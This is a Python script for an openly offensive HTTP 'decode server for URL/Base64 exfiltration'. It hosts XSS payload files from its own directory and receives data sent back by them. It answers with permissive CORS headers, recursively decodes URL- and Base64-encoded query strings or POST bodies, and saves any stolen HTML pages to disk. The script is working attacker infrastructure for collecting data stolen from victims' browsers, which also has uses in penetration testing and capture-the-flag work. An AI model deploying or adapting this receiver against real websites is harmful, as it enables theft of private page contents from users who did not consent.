import http.server
import socketserver
import urllib.parse
import base64
import os,sys,re
import argparse
from datetime import datetime, timezone

## 
## xss payloads should be living in the same directory as your recevier
## life is easier that way, tbh 
##

# --- Argument Parsing ---
parser = argparse.ArgumentParser(description='Decode server for URL/Base64 exfiltration')
parser.add_argument('--port', '-p', type=int, default=80, help='Port to listen on (default: 80)')
parser.add_argument('--show', '-s', action='store_true', help='Print decoded HTML to console')
args = parser.parse_args()

PORT = args.port
SHOW_HTML = args.show
MAX_DEPTH = 5  # max recursive decoding layers
SAVE_DIR = 'decoded_html'

# --- Setup Paths ---
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
SAVE_PATH = os.path.join(BASE_DIR, SAVE_DIR)
os.makedirs(SAVE_PATH, exist_ok=True)

print(f"Working dir: {BASE_DIR}")
print(f"Saving decoded HTML to: {SAVE_PATH}")
print(f"Listening on port: {PORT}, show mode: {SHOW_HTML}")

# Allow immediate socket reuse to avoid TIME_WAIT issues
socketserver.TCPServer.allow_reuse_address = True
socketserver.ThreadingTCPServer.allow_reuse_address = True

# --- Helpers ---
def fix_padding(b64_string):
    missing = len(b64_string) % 4
    if missing:
        b64_string += '=' * (4 - missing)
    return b64_string


def try_base64_decode(s: str):
    try:
        decoded = base64.b64decode(fix_padding(s))
        return decoded.decode('utf-8', errors='replace')
    except Exception:
        return None


def recursive_decode(data: str):
    """
    Recursively decode URL-encoding and Base64 layers up to MAX_DEPTH.
    Returns final data and list of (layer_type, snippet).
    """
    layers = []
    current = data
    for _ in range(MAX_DEPTH):
        url_decoded = urllib.parse.unquote(current)
        if url_decoded != current:
            layers.append(('url', url_decoded[:60]))
            current = url_decoded
            continue
        candidate = re.sub(r"\s+", "", current)
        if re.fullmatch(r'[A-Za-z0-9+/]+=*', candidate):
            b64_decoded = try_base64_decode(candidate)
            if b64_decoded is not None:
                layers.append(('b64', b64_decoded[:60]))
                current = b64_decoded
                continue
        break
    return current, layers


def save_html(content: str):
    timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
    filename = os.path.join(SAVE_PATH, f'decoded_{timestamp}.html')
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f"[+] Saved HTML: {filename}")
    except Exception as e:
        print(f"[!] Error saving HTML: {e}")

class DecodeHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stdout.write(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {fmt % args}\n")
        sys.stdout.flush()

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def handle_data(self, raw_data: str):
        key, sep, val = raw_data.partition('=')
        if not sep:
            print(f"[!] Bad format: {raw_data}")
            return
        val = urllib.parse.unquote(val)
        print(f"[+] Raw ({key}): {val[:60]}{'...' if len(val)>60 else ''}")
        final, layers = recursive_decode(val)
        for i, (lt, snippet) in enumerate(layers, 1):
            print(f"    Layer {i} ({lt}): {snippet}{'...' if len(snippet)>60 else ''}")
        print(f"[+] Final length: {len(final)} chars")
        print(f"    Final preview: {final[:20]!r}")
        low = final.lower()
        if '<html' in low or '<!doctype' in low:
            save_html(final)
            if SHOW_HTML:
                print("--- BEGIN DECODED HTML ---")
                print(final)
                print("--- END DECODED HTML ---")
        else:
            print("[!] Not HTML, skip saving.")
        sys.stdout.flush()

    def do_POST(self):
        print(f"🔍 POST {self.path}")
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        print(f"    Body: {body[:100]}{'...' if len(body)>100 else ''}")
        self.handle_data(body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Success')

    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        filepath = parsed.path.lstrip('/')
        if filepath and os.path.isfile(os.path.join(BASE_DIR, filepath)):
            return super().do_GET()
        print(f"🔍 GET {self.path}")
        if parsed.query:
            self.handle_data(parsed.query)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Success')

    def do_HEAD(self):
        return self.do_GET()

if __name__ == '__main__':
    server = socketserver.ThreadingTCPServer(('0.0.0.0', PORT), DecodeHandler)
    print(f"Starting decode server (threaded) on port {PORT}...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt received, shutting down server...")
    finally:
        server.shutdown()
        server.server_close()
        print("Server has exited cleanly.")


##
##
